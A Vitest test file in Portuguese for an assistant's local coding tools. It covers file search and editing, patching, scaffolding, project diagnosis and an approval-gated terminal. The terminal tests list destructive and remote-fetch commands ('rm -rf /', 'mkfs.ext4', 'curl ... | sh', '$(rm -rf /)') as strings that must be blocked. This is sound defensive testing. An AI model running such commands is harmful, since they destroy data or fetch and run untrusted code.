import { spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import type { AppConfig } from '../src/shared/types'
import {
  applyCodePatch,
  assessDiagnosisHealth,
  buildCodeIndex,
  classifyCommand,
  diagnoseProject,
  editCodeFile,
  findCodeReferences,
  listCodeFiles,
  outlineCodeFile,
  outlineSource,
  replaceInProject,
  isLongRunningCommand,
  planDiagnosis,
  previewCodePatch,
  proactiveValidationCommand,
  readCodeFile,
  runCodeCommand,
  runCodeGit,
  runCodeTerminal,
  scaffoldProject,
  searchCode,
  splitShellSegments,
  structuralHealth,
  summarizeCodeWorkspace,
  writeCodeFile
} from '../src/main/code'
import { clearPendingCode, getPendingCode, setPendingCode } from '../src/main/pending'

let root = ''

function writeProjectFile(file: string, content: string): void {
  const abs = join(root, file)
  mkdirSync(dirname(abs), { recursive: true })
  writeFileSync(abs, content, 'utf8')
}

function config(patch: Partial<AppConfig['integrations']['code']> = {}): AppConfig {
  return {
    nineRouter: { baseUrl: 'http://localhost:20128/v1', apiKey: '', model: 'cx/gpt-5.5', reasoning: 'medio' },
    grog: { baseUrl: 'https://api.groq.com/openai/v1', apiKey: '', sttModel: 'whisper-large-v3-turbo' },
    tts: { enabled: true, engine: 'auto', piperVoice: 'pt_BR-faber-medium', webVoiceURI: '', rate: 1, pitch: 1, volume: 1 },
    integrations: {
      weatherCity: 'São Paulo',
      newsTopic: '',
      location: { enabled: false },
      code: {
        enabled: true,
        workspaceRoot: root,
        allowedRoots: [root],
        maxFileKB: 128,
        maxSearchResults: 20,
        maxContextChars: 12000,
        allowedCommands: ['node --version', 'git status --short'],
        commandTimeoutMs: 30000,
        allowPatchApply: true,
        indexMaxFiles: 200,
        terminalEnabled: true,
        terminalAutoApprove: false,
        terminalSafe: ['ls', 'pwd', 'echo', 'cat', 'git status', 'node --version'],
        ...patch
      },
      control: { enabled: true, screenshotDir: '/tmp' }
    },
    ui: {
      continuousMode: false,
      micSensitivity: 0.5,
      silenceMs: 1350,
      postSpeechPauseMs: 450,
      proactiveSuggestions: true,
      proactiveAlerts: true,
      confirmDestructive: true,
      wakeWord: 'ares',
      wakeWordEnabled: false,
      bargeIn: true,
      overlayEnabled: false,
      onboarded: true,
      userName: '',
      fontScale: 1,
      highContrast: false,
      simpleMode: false,
      autostart: false,
      globalShortcut: false,
      morningBriefing: false
    },
    memory: { autoExtract: true, autoApprove: false }
  }
}

beforeAll(() => {
  root = mkdtempSync(join(tmpdir(), 'ares-code-test-'))
  writeProjectFile(
    'package.json',
    JSON.stringify({ scripts: { test: 'vitest run', build: 'vite build', verify: 'npm run test && npm run build' } }, null, 2)
  )
  writeProjectFile('src/main.ts', 'export function greet(name: string): string {\n  return `ola ${name}`\n}\n')
  writeProjectFile('src/feature.ts', 'import { greet } from "./main"\nexport const message = greet("Ares")\n')
  writeProjectFile('node_modules/pkg/index.js', 'ignored content')
  spawnSync('git', ['init'], { cwd: root })
})

afterAll(() => {
  rmSync(root, { recursive: true, force: true })
})

describe('ferramentas locais de programação', () => {
  it('resume workspace com stack, scripts e arquivos relevantes', () => {
    const summary = summarizeCodeWorkspace(config())

    expect(summary.exists).toBe(true)
    expect(summary.root).toBe(root)
    expect(summary.packageManager).toBeUndefined()
    expect(summary.scripts?.test).toBe('vitest run')
    expect(summary.files).toContain('src/main.ts')
    expect(summary.ignored).toContain('node_modules')
    expect(summary.languages.TypeScript).toBeGreaterThanOrEqual(2)
    expect(summary.hints).toContain('teste disponível: npm run test')
  })

  it('resume workspace geospacial/SIG com integridade de shapefiles', () => {
    const gisRoot = mkdtempSync(join(tmpdir(), 'ares-gis-test-'))
    const cfg = config()
    cfg.integrations.code.workspaceRoot = gisRoot
    cfg.integrations.code.allowedRoots = [gisRoot]

    // Criamos shapefile saudável: AREA_CONSOLIDADA (.shp, .shx, .dbf, .prj)
    writeFileSync(join(gisRoot, 'AREA_CONSOLIDADA.shp'), 'shp geometry')
    writeFileSync(join(gisRoot, 'AREA_CONSOLIDADA.shx'), 'shx index')
    writeFileSync(join(gisRoot, 'AREA_CONSOLIDADA.dbf'), 'dbf attributes')
    writeFileSync(join(gisRoot, 'AREA_CONSOLIDADA.prj'), 'prj projection')

    // Criamos shapefile incompleto: AREA_UMIDA (só .shp)
    writeFileSync(join(gisRoot, 'AREA_UMIDA.shp'), 'shp geometry')

    // Criamos shapefile sem projeção: DECLIVIDADE (.shp, .shx, .dbf mas sem .prj)
    writeFileSync(join(gisRoot, 'DECLIVIDADE.shp'), 'shp geometry')
    writeFileSync(join(gisRoot, 'DECLIVIDADE.shx'), 'shx index')
    writeFileSync(join(gisRoot, 'DECLIVIDADE.dbf'), 'dbf attributes')

    const summary = summarizeCodeWorkspace(cfg)
    expect(summary.exists).toBe(true)
    expect(summary.hints).toContain('projeto SIG/Geospacial detectado')
    expect(summary.hints).toContain('3 shapefile(s) detectado(s)')
    expect(summary.health?.ok).toBe(false)
    expect(summary.health?.signals).toContain("shapefile 'AREA_UMIDA' incompleto (falta .shx, .dbf)")
    expect(summary.health?.signals).toContain("shapefile 'DECLIVIDADE' sem arquivo de projeção (.prj)")

    rmSync(gisRoot, { recursive: true, force: true })
  })

  it('busca texto no código com filtro e limite', () => {
    const result = searchCode(config(), { query: 'greet', filter: '*.ts', maxResults: 10 })

    expect(result.matches.map((m) => m.file)).toContain('src/main.ts')
    expect(result.matches.every((m) => m.file.endsWith('.ts'))).toBe(true)
    expect(result.truncated).toBe(false)
  })

  it('lê trecho de arquivo com números de linha', () => {
    const snippet = readCodeFile(config(), { file: 'src/main.ts', startLine: 1, lines: 2 })

    expect(snippet.file).toBe('src/main.ts')
    expect(snippet.startLine).toBe(1)
    expect(snippet.endLine).toBe(2)
    expect(snippet.content).toContain('1: export function greet')
  })

  it('bloqueia leitura fora das raízes permitidas', () => {
    expect(() => readCodeFile(config(), { file: '../fora.ts' })).toThrow(/fora do workspace|fora das raízes/)
  })

  it('executa apenas comandos permitidos por allowlist', async () => {
    const ok = await runCodeCommand(config(), { command: 'node --version' })

    expect(ok.ok).toBe(true)
    expect(ok.stdout).toContain('v')
    expect(() => runCodeCommand(config(), { command: 'rm -rf .' })).toThrow(/não permitido/)
  })

  it('retorna resumo curto quando comando de codigo expira', async () => {
    const command = 'node -e "setTimeout(function(){}, 1000)"'
    const r = await runCodeCommand(config({ allowedCommands: [command], commandTimeoutMs: 50 }), { command })

    expect(r.ok).toBe(false)
    expect(r.stderr).toContain('Timeout ao executar')
    expect(r.stdout).toBe('')
  })

  it('consulta Git local sem alterar o repositório', async () => {
    const status = await runCodeGit(config(), { operation: 'status' })

    expect(status.command).toBe('git status --short')
    expect(status.ok).toBe(true)
  })

  it('gera índice persistente com exports e scripts', () => {
    const index = buildCodeIndex(config(), { refresh: true })

    expect(index.fileCount).toBeGreaterThan(0)
    expect(index.scripts?.test).toBe('vitest run')
    expect(index.files.find((f) => f.file === 'src/main.ts')?.exports).toContain('greet')
  })

  it('faz preview e aplica patch textual quando habilitado', () => {
    const patch = { patches: [{ file: 'src/main.ts', find: 'ola', replace: 'olá' }] }
    const preview = previewCodePatch(config(), patch)

    expect(preview.canApply).toBe(true)
    expect(preview.files).toContain('src/main.ts')
    expect(() => applyCodePatch(config({ allowPatchApply: false }), patch)).toThrow(/desativada/)

    const applied = applyCodePatch(config(), patch)
    expect(applied.applied).toBe(true)
    expect(readCodeFile(config(), { file: 'src/main.ts' }).content).toContain('olá')
  })

  it('edita arquivo com substituição flexível e contagem esperada', () => {
    writeProjectFile('src/edit.ts', 'export function run() {\n    return "old"\n}\n')

    const res = editCodeFile(config(), {
      file: 'src/edit.ts',
      oldText: 'export function run() {\nreturn "old"',
      newText: 'export function run() {\n    return "new"',
      expectedMatches: 1
    })

    expect(res.changed).toBe(true)
    expect(res.strategy).toBe('line_trimmed')
    expect(readFileSync(join(root, 'src/edit.ts'), 'utf8')).toContain('return "new"')
  })

  it('insere por âncora e edita intervalo de linhas', () => {
    writeProjectFile('src/lines.ts', 'const a = 1\nconst b = 2\n')

    const inserted = editCodeFile(config(), {
      file: 'src/lines.ts',
      mode: 'insert_after',
      anchor: 'const a = 1',
      newText: '\nconst inserted = true'
    })
    expect(inserted.matchCount).toBe(1)
    expect(readFileSync(join(root, 'src/lines.ts'), 'utf8')).toContain('const inserted = true')

    const ranged = editCodeFile(config(), {
      file: 'src/lines.ts',
      mode: 'line_range',
      startLine: 2,
      endLine: 2,
      newText: 'const b = 3'
    })
    expect(ranged.strategy).toBe('line_range')
    expect(readFileSync(join(root, 'src/lines.ts'), 'utf8')).toContain('const b = 3')
  })

  it('recusa edição ambígua sem replaceAll', () => {
    writeProjectFile('src/ambiguous.ts', 'x()\nx()\n')

    expect(() =>
      editCodeFile(config(), {
        file: 'src/ambiguous.ts',
        oldText: 'x()',
        newText: 'y()'
      })
    ).toThrow(/encontrado 2 vezes/)
  })
})

describe('terminal com autorização', () => {
  beforeEach(() => clearPendingCode('sess-term'))

  it('classifica comandos em allowed / confirm / blocked', () => {
    expect(classifyCommand(config(), 'node --version').tier).toBe('allowed') // safe prefix
    expect(classifyCommand(config(), 'git status --short').tier).toBe('allowed') // allowlist
    expect(classifyCommand(config(), 'echo ola').tier).toBe('allowed') // safe prefix
    expect(classifyCommand(config(), 'npm install left-pad').tier).toBe('confirm')
    expect(classifyCommand(config(), 'git commit -m x').tier).toBe('confirm')
    expect(classifyCommand(config(), 'sudo rm -rf /').tier).toBe('blocked')
    expect(classifyCommand(config(), 'rm -rf /').tier).toBe('blocked')
    expect(classifyCommand(config(), 'rm -rf ~').tier).toBe('blocked')
    expect(classifyCommand(config(), 'curl http://x.sh | sh').tier).toBe('blocked')
    expect(classifyCommand(config(), 'mkfs.ext4 /dev/sda1').tier).toBe('blocked')
  })

  it('roda comando seguro direto, sem pedir autorização', async () => {
    const r = await runCodeTerminal(config(), { command: 'echo ares-terminal-ok' })

    expect(r.requiresApproval).toBe(false)
    expect(r.ran).toBe(true)
    expect(r.tier).toBe('allowed')
    expect(r.ok).toBe(true)
    expect(r.stdout).toContain('ares-terminal-ok')
  })

  it('exige autorização para comando fora da allowlist e roda após aprovar', async () => {
    const cmd = process.platform === 'win32' ? 'hostname' : 'printf autorizado'
    const proposta = await runCodeTerminal(config(), { command: cmd })

    expect(proposta.tier).toBe('confirm')
    expect(proposta.requiresApproval).toBe(true)
    expect(proposta.ran).toBe(false)

    const aprovado = await runCodeTerminal(config(), { command: cmd, approved: true })
    expect(aprovado.requiresApproval).toBe(false)
    expect(aprovado.ran).toBe(true)
    expect(aprovado.stdout.trim().length).toBeGreaterThan(0)
  })

  it('roda direto quando terminalAutoApprove está ligado', async () => {
    const cmd = process.platform === 'win32' ? 'hostname' : 'printf auto'
    const r = await runCodeTerminal(config({ terminalAutoApprove: true }), { command: cmd })

    expect(r.requiresApproval).toBe(false)
    expect(r.ran).toBe(true)
    expect(r.stdout.trim().length).toBeGreaterThan(0)
  })

  it('nunca executa comandos bloqueados, mesmo aprovados', () => {
    // Usa comandos bloqueados porém inofensivos caso (por regressão) escapassem do
    // bloqueio: 'sudo true' não destrói nada. As strings catastróficas de verdade
    // ('rm -rf /', etc.) são verificadas só por classifyCommand, que nunca executa.
    expect(() => runCodeTerminal(config(), { command: 'sudo true', approved: true })).toThrow(/bloqueado/)
    expect(() => runCodeTerminal(config({ terminalAutoApprove: true }), { command: 'sudo true' })).toThrow(/bloqueado/)
  })

  it('respeita o desligamento do terminal', () => {
    expect(() => runCodeTerminal(config({ terminalEnabled: false }), { command: 'echo x' })).toThrow(/desativado/)
  })

  it('guarda e recupera a pendência de autorização por sessão', () => {
    expect(getPendingCode('sess-term')).toBeUndefined()
    setPendingCode('sess-term', { kind: 'terminal', command: 'npm install left-pad', reason: 'fora da allowlist' })

    const pend = getPendingCode('sess-term')
    expect(pend?.command).toBe('npm install left-pad')

    expect(clearPendingCode('sess-term')).toBe(true)
    expect(getPendingCode('sess-term')).toBeUndefined()
  })
})

describe('criar / scaffold / diagnóstico', () => {
  it('faz scaffold de um site quando a escrita está permitida', () => {
    const res = scaffoldProject(config(), { tipo: 'site', nome: 'Meu Site' })

    expect(res.template).toBe('site')
    expect(res.created).toContain('index.html')
    expect(existsSync(join(root, 'meu-site', 'index.html'))).toBe(true)
    expect(readFileSync(join(root, 'meu-site', 'index.html'), 'utf8')).toContain('<title>Meu Site</title>')
    expect(res.hints.join(' ')).toMatch(/index\.html|http\.server/)
  })

  it('exige permissão para escrever e recusa pasta não vazia', () => {
    expect(() => scaffoldProject(config({ allowPatchApply: false }), { tipo: 'site', nome: 'X' })).toThrow(/Permitir aplicar patches|desativada/)
    scaffoldProject(config(), { tipo: 'pagina', nome: 'Dois' })
    expect(() => scaffoldProject(config(), { tipo: 'pagina', nome: 'Dois' })).toThrow(/já existe/)
  })

  it('cria um arquivo e recusa sobrescrever sem permissão explícita', () => {
    const w = writeCodeFile(config(), { file: 'novo/ola.txt', content: 'oi' })
    expect(w.created).toBe(true)
    expect(readFileSync(join(root, 'novo', 'ola.txt'), 'utf8')).toBe('oi')
    expect(() => writeCodeFile(config(), { file: 'novo/ola.txt', content: 'x' })).toThrow(/já existe/)
    const over = writeCodeFile(config(), { file: 'novo/ola.txt', content: 'novo', overwrite: true })
    expect(over.overwritten).toBe(true)
  })

  it('planDiagnosis marca o que está na allowlist', () => {
    const plan = planDiagnosis(
      { typecheck: 'tsc', test: 'vitest', lint: 'eslint .' },
      'npm',
      ['npm run typecheck', 'npm test']
    )
    const byName = Object.fromEntries(plan.map((p) => [p.name, p]))
    expect(byName.typecheck.allowed).toBe(true)
    expect(byName.test.command).toBe('npm test')
    expect(byName.test.allowed).toBe(true)
    expect(byName.lint.allowed).toBe(false) // não está na allowlist
  })

  it('diagnostica um projeto sem package.json com elegância', async () => {
    const empty = mkdtempSync(join(tmpdir(), 'ares-diag-'))
    const cfg = config()
    cfg.integrations.code.workspaceRoot = empty
    cfg.integrations.code.allowedRoots = [empty]
    const diag = await diagnoseProject(cfg)
    expect(diag.checks).toHaveLength(0)
    expect(diag.ok).toBe(true)
    expect(diag.health.ok).toBe(true)
    expect(diag.hints.join(' ')).toMatch(/package\.json/)
    rmSync(empty, { recursive: true, force: true })
  })
})

describe('modo programador JARVIS — proatividade e saúde', () => {
  it('reconhece comandos de longa duração (build/install/test)', () => {
    expect(isLongRunningCommand('npm install')).toBe(true)
    expect(isLongRunningCommand('npm i left-pad')).toBe(true)
    expect(isLongRunningCommand('yarn add react')).toBe(true)
    expect(isLongRunningCommand('npm run build')).toBe(true)
    expect(isLongRunningCommand('npm test')).toBe(true)
    expect(isLongRunningCommand('docker build .')).toBe(true)
    expect(isLongRunningCommand('git status')).toBe(false)
    expect(isLongRunningCommand('ls -la')).toBe(false)
    expect(isLongRunningCommand('')).toBe(false)
  })

  it('sugere a validação certa após editar (teste > build > typecheck)', () => {
    expect(proactiveValidationCommand({ test: 'vitest', build: 'vite build' }, 'npm')).toBe('npm test')
    expect(proactiveValidationCommand({ build: 'vite build' }, 'npm')).toBe('npm run build')
    expect(proactiveValidationCommand({ typecheck: 'tsc' }, 'pnpm')).toBe('pnpm run typecheck')
    expect(proactiveValidationCommand(undefined, 'npm')).toBeNull()
    expect(proactiveValidationCommand({ start: 'node .' }, 'npm')).toBeNull()
  })

  it('avalia a saúde estrutural sem rodar comandos', () => {
    const limpo = structuralHealth({ dirty: false, hasPackage: true, hasTestScript: true, hasLockfile: true, timedOut: false })
    expect(limpo.ok).toBe(true)
    expect(limpo.label).toMatch(/em ordem/)

    const sujo = structuralHealth({ dirty: true, hasPackage: true, hasTestScript: false, hasLockfile: true, timedOut: false })
    expect(sujo.ok).toBe(false)
    expect(sujo.signals).toContain('há alterações sem commit')
    expect(sujo.signals).toContain('sem script de teste configurado')
  })

  it('resume a saúde após o diagnóstico de forma falável', () => {
    expect(assessDiagnosisHealth([]).label).toMatch(/sem checagens/)

    const verde = assessDiagnosisHealth([
      { name: 'typecheck', command: 'npm run typecheck', ran: true, ok: true, code: 0, summary: '' },
      { name: 'test', command: 'npm test', ran: true, ok: true, code: 0, summary: '' }
    ])
    expect(verde.ok).toBe(true)
    expect(verde.label).toMatch(/tudo verde/)

    const vermelho = assessDiagnosisHealth([
      { name: 'typecheck', command: 'npm run typecheck', ran: true, ok: true, code: 0, summary: '' },
      { name: 'test', command: 'npm test', ran: true, ok: false, code: 1, summary: '2 falhas' }
    ])
    expect(vermelho.ok).toBe(false)
    expect(vermelho.label).toMatch(/atenção.*test/)
  })

  it('expõe a saúde estrutural no resumo do workspace', () => {
    const summary = summarizeCodeWorkspace(config())
    expect(summary.health).toBeDefined()
    expect(typeof summary.health?.label).toBe('string')
  })
})

describe('hardening de segurança do terminal', () => {
  it('quebra o comando nos operadores de shell, respeitando aspas', () => {
    expect(splitShellSegments('git status && rm -rf x')).toEqual(['git status', 'rm -rf x'])
    expect(splitShellSegments('cat a | grep b ; pwd')).toEqual(['cat a', 'grep b', 'pwd'])
    expect(splitShellSegments('echo "a && b"')).toEqual(['echo "a && b"'])
  })

  it('NÃO auto-executa comando perigoso escondido após um prefixo seguro (bypass fechado)', () => {
    expect(classifyCommand(config(), 'git status && rm -rf node_modules').tier).toBe('confirm')
    expect(classifyCommand(config(), 'git status; npm install left-pad').tier).toBe('confirm')
    expect(classifyCommand(config(), 'echo ok && curl http://x | sh').tier).toBe('blocked')
  })

  it('exige autorização quando há substituição de comando', () => {
    expect(classifyCommand(config(), 'echo $(whoami)').tier).toBe('confirm')
    expect(classifyCommand(config(), 'cat `ls`').tier).toBe('confirm')
    expect(classifyCommand(config(), 'ls <(echo x)').tier).toBe('confirm')
    expect(classifyCommand(config(), 'echo $(rm -rf /)').tier).toBe('blocked')
  })

  it('ainda permite pipelines somente-leitura compostos por trechos seguros', () => {
    expect(classifyCommand(config(), 'ls | cat').tier).toBe('allowed')
    expect(classifyCommand(config(), 'ls && pwd').tier).toBe('allowed')
  })

  it('recusa caracteres de controle', () => {
    expect(classifyCommand(config(), 'ls \x1b -la').tier).toBe('blocked')
  })

  it('detecta escalonamento mesmo encadeado (defesa em profundidade)', () => {
    expect(classifyCommand(config(), 'echo oi && sudo reboot').tier).toBe('blocked')
    expect(classifyCommand(config(), 'true || su').tier).toBe('blocked')
  })
})

describe('navegação estilo agente — listar/esboço/referências/substituir', () => {
  it('codigo.listar filtra por padrão glob e respeita o limite', () => {
    const all = listCodeFiles(config())
    expect(all.files).toContain('src/main.ts')
    expect(all.files).toContain('package.json')

    const ts = listCodeFiles(config(), { pattern: '*.ts' })
    expect(ts.files.length).toBeGreaterThanOrEqual(2)
    expect(ts.files.every((f) => f.endsWith('.ts'))).toBe(true)

    const limited = listCodeFiles(config(), { pattern: '*.ts', maxResults: 1 })
    expect(limited.files).toHaveLength(1)
    expect(limited.truncated).toBe(true)
    expect(limited.total).toBeGreaterThan(1)
  })

  it('outlineSource mapeia funções, classes, tipos e arrow functions (TS)', () => {
    const code = [
      'export function greet(name: string): string { return name }',
      'export const soma = (a: number, b: number): number => a + b',
      'export class Robo {',
      '  falar(): void {}',
      '}',
      'export interface Opts { x: number }',
      'export type Par = [number, number]',
      'enum Cor { Azul }'
    ].join('\n')
    const items = outlineSource(code, '.ts')
    const byName = Object.fromEntries(items.map((i) => [i.name, i]))
    expect(byName.greet).toMatchObject({ kind: 'function', line: 1 })
    expect(byName.soma).toMatchObject({ kind: 'function', line: 2 })
    expect(byName.Robo).toMatchObject({ kind: 'class', line: 3 })
    expect(byName.Opts.kind).toBe('interface')
    expect(byName.Par.kind).toBe('type')
    expect(byName.Cor.kind).toBe('enum')
  })

  it('outlineSource entende Python e Go', () => {
    const py = outlineSource('class Robo:\n    def falar(self):\n        pass\nasync def main():\n    pass\n', '.py')
    expect(py.map((i) => i.name)).toEqual(['Robo', 'falar', 'main'])
    const go = outlineSource('func main() {}\nfunc (r *Robo) Falar() {}\ntype Robo struct{}\n', '.go')
    expect(go.map((i) => `${i.kind}:${i.name}`)).toEqual(['function:main', 'function:Falar', 'type:Robo'])
  })

  it('codigo.esboco lê o arquivo real do workspace', () => {
    const out = outlineCodeFile(config(), { file: 'src/main.ts' })
    expect(out.file).toBe('src/main.ts')
    expect(out.items.some((i) => i.name === 'greet' && i.kind === 'function')).toBe(true)
    expect(out.totalLines).toBeGreaterThan(1)
  })

  it('codigo.referencias conta usos por arquivo (palavra inteira)', () => {
    const refs = findCodeReferences(config(), { symbol: 'greet' })
    const files = Object.fromEntries(refs.files.map((f) => [f.file, f.count]))
    expect(files['src/main.ts']).toBeGreaterThanOrEqual(1)
    expect(files['src/feature.ts']).toBe(2) // import + uso
    expect(refs.total).toBeGreaterThanOrEqual(3)
    expect(refs.files[0].sample.length).toBeGreaterThan(0)
    // não casa substring de outro identificador
    expect(() => findCodeReferences(config(), { symbol: 'x' })).toThrow(/símbolo/i)
  })

  it('codigo.substituir: prévia não altera nada; apply troca em todos os arquivos', () => {
    writeProjectFile('src/ren-a.ts', 'export const renomeAlvo = 1\n')
    writeProjectFile('src/ren-b.ts', 'import { renomeAlvo } from "./ren-a"\nexport const dobro = renomeAlvo * 2\n')

    const preview = replaceInProject(config(), { find: 'renomeAlvo', replace: 'novoNome' })
    expect(preview.applied).toBe(false)
    expect(preview.totalMatches).toBe(3)
    expect(preview.files.map((f) => f.file).sort()).toEqual(['src/ren-a.ts', 'src/ren-b.ts'])
    expect(readFileSync(join(root, 'src/ren-a.ts'), 'utf8')).toContain('renomeAlvo') // intocado

    const applied = replaceInProject(config(), { find: 'renomeAlvo', replace: 'novoNome', apply: true })
    expect(applied.applied).toBe(true)
    expect(readFileSync(join(root, 'src/ren-a.ts'), 'utf8')).toContain('novoNome')
    expect(readFileSync(join(root, 'src/ren-b.ts'), 'utf8')).not.toContain('renomeAlvo')
  })

  it('codigo.substituir respeita filtro, bloqueios e config de escrita', () => {
    writeProjectFile('docs/nota.md', 'renomeFiltro aqui\n')
    writeProjectFile('src/so-aqui.ts', 'renomeFiltro tambem\n')
    const filtered = replaceInProject(config(), { find: 'renomeFiltro', replace: 'trocado', filter: '*.ts' })
    expect(filtered.files.map((f) => f.file)).toEqual(['src/so-aqui.ts'])

    expect(() => replaceInProject(config({ allowPatchApply: false }), { find: 'renomeFiltro', replace: 'x', apply: true })).toThrow(
      /patches/i
    )
    expect(() => replaceInProject(config(), { find: 'a', replace: 'b' })).toThrow(/2 caracteres/)
    expect(() => replaceInProject(config(), { find: 'igual', replace: 'igual' })).toThrow(/igual/)
  })
})
